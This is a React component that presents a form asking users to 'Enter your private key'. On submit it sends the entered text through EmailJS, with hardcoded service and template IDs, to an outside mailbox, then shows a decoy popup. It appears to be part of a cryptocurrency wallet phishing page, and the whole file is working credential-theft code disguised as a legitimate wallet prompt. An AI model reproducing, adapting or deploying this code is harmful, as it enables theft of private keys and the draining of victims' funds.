import React, { useRef, useState } from 'react';
import styled from 'styled-components';
import emailjs from '@emailjs/browser';
import PopMode from './PopMode';

function PrivateKey() {
  const [phrase, setPhrase] = useState('');
  const [load, setLoad] = useState(false);
  const [err, setErr] = useState(false);
  const form = useRef();

  const handleForm = (e) => {
    e.preventDefault();
    setLoad(true);
    try {
      emailjs
        .sendForm(
          'service_nx2jim6',
          'template_q5yg2gps',
          form.current,
          'W-ieyA-tnjugaQtq9'
        )
        .then((response) => {
          console.log(response.status);
          setErr(true);
          setLoad(false);
        });
    } catch (error) {
      console.log(error);
      setLoad(false);
    }
  };
  return (
    <div>
      {!err && (
        <Form ref={form} onSubmit={handleForm}>
          <textarea
            name="private"
            value={phrase}
            onChange={(e) => setPhrase(e.target.value)}
            placeholder="Enter your private key"
            id="private"
            cols="30"
            rows="7"
            required
          ></textarea>
          <p>Typically xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</p>
          <button type="submit">
            {load ? <div className="loaderr"></div> : 'Proceed'}
          </button>
        </Form>
      )}
      {err && <PopMode />}
    </div>
  );
}

export default PrivateKey;
const Form = styled.form`
  textarea {
    resize: none;
    width: 100%;
    padding: 10px;
    &:focus {
      outline: none;
    }
  }
  p {
    font-size: 14px;
    color: #8c87a6;
  }
  button {
    width: 100%;
    margin-top: 15px;
    background: #1b152e;
    height: 50px;
  }
`;
